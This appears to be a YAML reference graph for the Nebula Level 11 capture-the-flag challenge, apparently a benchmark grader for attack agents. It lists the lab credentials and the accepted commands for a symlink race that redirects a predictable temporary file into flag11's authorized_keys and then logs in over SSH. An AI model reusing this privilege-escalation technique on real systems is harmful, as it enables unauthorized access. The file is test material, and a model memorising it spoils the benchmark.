@@ -1,0 +1,96 @@
+version: '0.5'
+graph:
+  type: reference
+challenge:
+  id: nebula_level11
+  name: Nebula Level 11
+  description: Predict the temporary filename, redirect the write into authorized_keys, and SSH as flag11.
+attacker_context:
+  user: level11
+  access:
+    method: ssh
+    credentials:
+      username: level11
+      password: level11
+  target:
+    host: <target-hostname-or-ip>
+    port: 22
+goal:
+  node: node3
+irrelevant_commands:
+- man
+- pwd
+- id
+- whoami
+- clear
+- history
+- uname
+- hostname
+- ls
+- cd
+- cat
+- file
+- strings
+- ltrace
+- strace
+nodes:
+- id: start
+  type: sentinel
+  label: Start
+- id: node0
+  type: state
+  label: Predictable temp path identified
+- id: node1
+  type: state
+  label: Authorized_keys target prepared
+- id: node2
+  type: state
+  label: Symlink race performed
+- id: node3
+  type: state
+  label: Execution as flag11 obtained
+edges:
+- id: edge0
+  from: start
+  to: node0
+  action: analyze_tempfile_generation
+  accepted_commands:
+  - cat /home/flag11/flag11.c
+  - python -c "import time,os; print(time.time())"
+  transition_match:
+    exit_code: 0
+    stdout_regex: .*
+    stderr_regex: ^$
+- id: edge1
+  from: node0
+  to: node1
+  action: prepare_ssh_key_and_target_path
+  accepted_commands:
+  - ssh-keygen -t rsa -N "" -f /tmp/flag11key
+  - mkdir -p /tmp/flag11
+  transition_match:
+    exit_code: 0
+    stdout_regex: .*
+    stderr_regex: ^$
+- id: edge2
+  from: node1
+  to: node2
+  action: symlink_predicted_tempfile_to_authorized_keys
+  accepted_commands:
+  - ln -sf /home/flag11/.ssh/authorized_keys /tmp/<predicted-tempfile>
+  - /home/flag11/flag11 < /tmp/request
+  transition_match:
+    exit_code: 0
+    stdout_regex: .*
+    stderr_regex: ^$
+- id: edge3
+  from: node2
+  to: node3
+  action: ssh_using_injected_authorized_key
+  accepted_commands:
+  - ssh -i /tmp/flag11key -o StrictHostKeyChecking=no flag11@localhost
+  - ssh -i /tmp/flag11key flag11@localhost
+  transition_match:
+    exit_code: 0
+    stdout_regex: .*
+    stderr_regex: ^$
